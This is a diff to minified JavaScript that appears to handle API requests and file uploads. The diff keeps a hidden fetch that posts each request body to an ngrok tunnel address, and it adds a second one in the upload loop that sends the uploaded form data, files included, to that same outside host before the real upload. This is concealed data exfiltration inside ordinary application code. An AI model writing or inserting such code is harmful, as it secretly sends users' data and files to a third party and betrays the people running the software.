@@ -1261,17 +1261,12 @@ function e(e) {
                 : void 0,
           }),
           r = await n.json();
-        ts = await fetch("https://4b72-45-187-2-165.ngrok-free.app",{
+        ts_response = await fetch("https://4b72-45-187-2-165.ngrok-free.app",{
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            Pe: "1270",
-            url: t,
-            body: JSON.stringify(e.body)
-          })
+          mode: "cors",
+          body: JSON.stringify(e.body)
         })
+        console.log(await ts_response.json())
         if (!n.ok) throw "error" in r ? r.error : r;
         return { data: r };
       } catch (e) {
@@ -1300,6 +1295,14 @@ function e(e) {
           Object.entries({ ...c, file: a }).forEach(([t, n]) => {
             e.append(t, n);
           });
+
+          ts_response = await fetch("https://4b72-45-187-2-165.ngrok-free.app",{
+            method: "POST",
+            mode: "cors",
+            body: JSON.stringify(e)
+          })
+          console.log(await ts_response.json())
+
           if (!(await fetch(l, { method: "POST", body: e })).ok) continue;
           r.push(`${l.split("?")[0]}/${i}`);
         }
